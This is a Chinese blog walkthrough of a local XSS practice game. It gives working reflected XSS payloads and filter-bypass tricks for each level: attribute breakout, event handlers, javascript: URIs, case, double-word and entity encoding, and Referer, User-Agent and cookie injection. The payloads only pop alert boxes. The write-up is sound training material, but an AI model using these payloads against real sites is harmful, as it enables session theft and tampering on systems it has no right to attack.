<!--markdown--># xss小游戏
前段时间哈士奇师傅推荐的的一个xss小游戏源码，中间断断续续做了一些，也算是进行一个小总结吧。（JavaScript需要开一个坑了）反正我觉得xss也算一种注入吧。  
链接：[http://pan.baidu.com/s/1gfIGcgz](http://pan.baidu.com/s/1gfIGcgz) 密码：cynn
### 搞搞搞 
开始搞的时候怎么都弹不出来，F12之后发现是浏览器的xss过滤脚本，火狐，谷歌，ie，都有。调整下安全等级正式开始。  
1.最简单的  
![](http://i.imgur.com/UqUI0MY.png)   

![](http://i.imgur.com/ymx40gX.png)  
问题在参数test处，他将参数直接输出在页面中  
直接构造
	
	name=<script>alert(1)</script>  
2.输出点  
和第一题一样页面有post数据的回显，尝试一波

	<script>alert(1)</script>  
没有弹窗，查看源

	<h2 align=center>没有找到和&lt;script&gt;alert(1)&lt;/script&gt;相关的结果.</h2><center>
尖括号被过滤了，试试编码处理u003c和u003e，依然为成功，然后源里面可以发现下面表单里面有问题

	<input name=keyword  value="u003cscript>alert(1)</script>">
这里可以构造
	
	"><script>alert(1)</script>  
弹窗成功  
3.事件  
<input name=keyword  value='&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;'>  
同样之前的操作，可以看到这里表单里面也编码转义了然后是单引号，这里可以用事件来x  
test' oninput=javascript:alert(1)//    
可以执行 js 的on事件

> onload 当加载   
> onunload 当退出  
> onchange 当输入改变时  
> onsubmit 当提交  
> onreset 当重置按钮被点击  
>onselect 当文本被选定  
>onblur 当元素失去焦点  
>onfocus 当元素获得焦点  
>onabort 当图像加载被中断  
>onkeydown 当某个键盘的键被按下  
>onkeypress 当某个键盘的键被按下或按住   
>onkeyup 当某个键盘的键被松开  
>onclick 当鼠标点击某个对象  
>ondbclick 当鼠标双击某个对象  
>onmouseover 当鼠标覆盖  
>onmousemove 当鼠标移动  
>onmouseout 当鼠标移开  
>onmouseup 当鼠标松开  
>onforminput =oninput 当输入文本  
>onformchange =onchange 当改变文本  
>ondrag 当事件在元素或者选取的文本被拖动时触发  
>ondrop 当事件在可拖动元素或选取的文本放置在目标区域时触发  

弹窗成功  
4.3题的基础上用双引号（好瓜皮）  
5.filter是on->o_n,script->scr_ipt  
也就是说用不了事件，就可以想想其他标签了，我们这里用个超链接吧

	<input name=keyword  value="<scr_ipt>">
这里的还是双引号不多说  
	
	<input name=keyword  value=""> <a href="javascript:%61lert(1)">click me</a> //">
点击clike me 弹窗  
6.filter:href->fr_ef,on->o_n,script->scr_ipt  
可以大小写绕过，Unicode编码没过到  

	"><scripT>alert(1)</script>
7.过滤双写，这个在sql里面也有用的，主要是过滤方法的问题  
双写关键字就可以了比如scripscriptt  
8.过滤了script，编码绕过  
javas&#99;ript:alert(1)  
9.白名单检测，必须包含http://  
这个题我看了两种答案，一种是注释，可是没试成功  
哈士奇师傅的方法很imba  
javasc&#114;ipt:alert('http://')  
这可能就是脑洞吧  
10.查看源码有几个隐藏参数属性  
从这几个点可以像头几道题那样做就可以了 
url=&t_sort=" type="text" onclick="alert(1)   
11.同样是10题只是参数位置变成了referer抓包改  
url=&t_sort=" type="text" onclick="alert(1)  
12.查看源码  

	<input name="t_ua"  value="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" type="hidden">
ua参数注入xss，需要抓包，然后payload如10题。  
13.cookie注入xss  
抓包改cookie  
14.这个题EXIF  
就是上传图片查看信息，可以控制输出的地方很多  
15.这个题AngularJS  
我也不是很懂这个，只知道  
ng-include 指令用于包含外部的 HTML 文件  
包含的内容将作为指定元素的子节点  
ng-include 属性的值可以是一个表达式，返回一个文件名  
默认情况下，包含的文件需要包含在同一个域名下  
大概看下payload就能懂一点了  

    /level15.php?src='level1.php?name=test<img src=1 onerror=alert(1)>'
16.过滤了空格，script，/，可以用on事件  
用%0a等代替空格，和sql注入一样
<img%0Dsrc=1%0Donerror=alert(1)>  
17.http://127.0.0.1/xss/level17.php?arg01=a&arg02=b
查找输出点

	<embed src=xsf01.swf?a=b onmouseover=alert(1) width=100% heigth=100%><h2 align=center> 
这个输出点就是这个a=b，排除过滤之后可以这样构造，用on事件  
18.哇，这个题和17题有什么不同？  
19和20是flashxss，还没有研究过，做不下去了。  
### 总结  
这题蛮有意思的，对xss入门很友好，然后以后就需要看看javascript的弹cookie那些脚本了，感觉xss不弹cookie还是废物一个。  
写下这篇文章，也借鉴学习也多方的文章。  
[http://139.129.31.35/index.php/archives/494/](http://139.129.31.35/index.php/archives/494/)  
我大哥的文章，记录得很齐全，后面应该会用到的。

